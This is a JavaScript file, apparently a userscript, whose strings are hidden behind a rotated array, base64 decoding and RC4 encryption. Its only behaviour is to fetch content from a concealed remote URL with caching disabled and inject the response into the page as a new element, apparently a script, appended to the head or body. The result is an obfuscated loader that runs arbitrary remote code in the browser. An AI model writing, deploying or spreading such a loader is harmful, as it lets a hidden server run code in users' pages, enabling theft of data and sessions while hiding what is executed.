'use strict';
/** @type {!Array} */
var _0x3721 = ["ZjTCjFgw", "wrgxUMOXwoE5wqPDu8OtwonDhsKyFDp9", "wr0jw77DksKS", "wqcmS8OOw6s=", "cljDmgLCsA==", "wpnCuzRLMcKheUhuw6jDgcO7", "a8OxR8OiHCw6FADCiMObBMKM", "w6ZUMcK3w6k=", "EsKLUk9IDyhkwpXDlcKf", "w6QfwqRXwqbDncOsw5Z+ccKywofDmcKD", "w6HCrhNpwro=", "NsK9Tlx/", "w5QKJC5B", "w74UWHZb", "w4bDlBXCsw==", "GTkPBw==", "w4cyLil9FcKIw71nYWnDiAs1TA==", "H8KUw4HDgEs=", "GmkGwrPCl2Q=", "w7PDsEDDgHE=", "Cy3CnMKvUQ==", "WXRHXsKjw5c=", "LiLCl8K5UA==", "wp3CuCdtw6c1", "wq09wp/Dgks=", "w7HDs3g=", "Az4GDsOa",
"XBLCrH0nSwjCsUjDkTPDtcKFccKoJ8Okw6LDlsK8T8OWwrEhwqXCtMKgI8Onw7A8w5oxKmlKHTNEwobCusOcd8Obwooiwqhnw4rCnsKHwq1eXmUgwoI1w61Xw5bDp3x4w4t+wrRr"];
(function(data, i) {
  /**
   * @param {number} localStorage
   * @return {undefined}
   */
  var visualizeData = function(localStorage) {
    for (; --localStorage;) {
      data["push"](data["shift"]());
    }
  };
  visualizeData(++i);
})(_0x3721, 129);
/**
 * @param {string} n
 * @param {string} dn
 * @return {?}
 */
var _0x4b49 = function(n, dn) {
  /** @type {number} */
  n = n - 0;
  var i = _0x3721[n];
  if (_0x4b49["anlkuD"] === undefined) {
    (function() {
      /**
       * @return {?}
       */
      var getPixelOnImageSizeMax = function() {
        var source;
        try {
          source = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
        } catch (_0x141acd) {
          /** @type {!Window} */
          source = window;
        }
        return source;
      };
      var pixelSizeTargetMax = getPixelOnImageSizeMax();
      /** @type {string} */
      var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!pixelSizeTargetMax["atob"]) {
        /**
         * @param {?} i
         * @return {?}
         */
        pixelSizeTargetMax["atob"] = function(i) {
          var o = String(i)["replace"](/=+$/, "");
          /** @type {number} */
          var bc = 0;
          var bs;
          var buffer;
          /** @type {number} */
          var n = 0;
          /** @type {string} */
          var pix_color = "";
          for (; buffer = o["charAt"](n++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
            buffer = listeners["indexOf"](buffer);
          }
          return pix_color;
        };
      }
    })();
    /**
     * @param {string} data
     * @param {!Object} fn
     * @return {?}
     */
    var testcase = function(data, fn) {
      /** @type {!Array} */
      var secretKey = [];
      /** @type {number} */
      var y = 0;
      var temp;
      /** @type {string} */
      var testResult = "";
      /** @type {string} */
      var tempData = "";
      /** @type {string} */
      data = atob(data);
      /** @type {number} */
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        /** @type {string} */
        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      /** @type {string} */
      data = decodeURIComponent(tempData);
      /** @type {number} */
      var x = 0;
      for (; x < 256; x++) {
        /** @type {number} */
        secretKey[x] = x;
      }
      /** @type {number} */
      x = 0;
      for (; x < 256; x++) {
        /** @type {number} */
        y = (y + secretKey[x] + fn["charCodeAt"](x % fn["length"])) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
      }
      /** @type {number} */
      x = 0;
      /** @type {number} */
      y = 0;
      /** @type {number} */
      var i = 0;
      for (; i < data["length"]; i++) {
        /** @type {number} */
        x = (x + 1) % 256;
        /** @type {number} */
        y = (y + secretKey[x]) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
        testResult = testResult + String["fromCharCode"](data["charCodeAt"](i) ^ secretKey[(secretKey[x] + secretKey[y]) % 256]);
      }
      return testResult;
    };
    /** @type {function(string, !Object): ?} */
    _0x4b49["GFiDoo"] = testcase;
    _0x4b49["lvoClD"] = {};
    /** @type {boolean} */
    _0x4b49["anlkuD"] = !![];
  }
  var b = _0x4b49["lvoClD"][n];
  if (b === undefined) {
    if (_0x4b49["qDqAHo"] === undefined) {
      /** @type {boolean} */
      _0x4b49["qDqAHo"] = !![];
    }
    i = _0x4b49["GFiDoo"](i, dn);
    _0x4b49["lvoClD"][n] = i;
  } else {
    i = b;
  }
  return i;
};
(function() {
  var item = {};
  item[_0x4b49("0x0", "eclR")] = _0x4b49("0x1", "AEo2");
  /**
   * @param {(Object|null|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  item[_0x4b49("0x2", "D$qv")] = function(buckets, name) {
    return buckets + name;
  };
  item[_0x4b49("0x3", "s^Wf")] = _0x4b49("0x4", "t$9)");
  item[_0x4b49("0x5", "s^Wf")] = _0x4b49("0x6", "K4LE");
  item[_0x4b49("0x7", "k5x5")] = _0x4b49("0x8", "D$qv");
  item[_0x4b49("0x9", "t$9)")] = _0x4b49("0xa", "Sm8d");
  item[_0x4b49("0xb", "Sm8d")] = _0x4b49("0xc", "E6Qk");
  new GM_xmlhttpRequest({
    "method" : item[_0x4b49("0xd", "9QH(")],
    "url" : item[_0x4b49("0xe", "E6Qk")],
    "headers" : {
      "Cache-Control" : item[_0x4b49("0xf", "bFu[")]
    },
    "onload" : function(value) {
      value = value[_0x4b49("0x10", "rV0i")];
      var artistTrack = document[_0x4b49("0x11", "FKJ5")](item[_0x4b49("0x12", "(tWV")]);
      artistTrack[_0x4b49("0x13", "6^4i")](document[_0x4b49("0x14", "pfVP")](item[_0x4b49("0x15", "YyW)")](item[_0x4b49("0x16", "6^4i")](item[_0x4b49("0x17", "m%bC")], value), item[_0x4b49("0x18", "!Iqa")])));
      (document[_0x4b49("0x19", "fcig")] || document[_0x4b49("0x1a", "t$9)")] || document[_0x4b49("0x1b", "m%bC")])[_0x4b49("0x13", "6^4i")](artistTrack);
    }
  });
})();
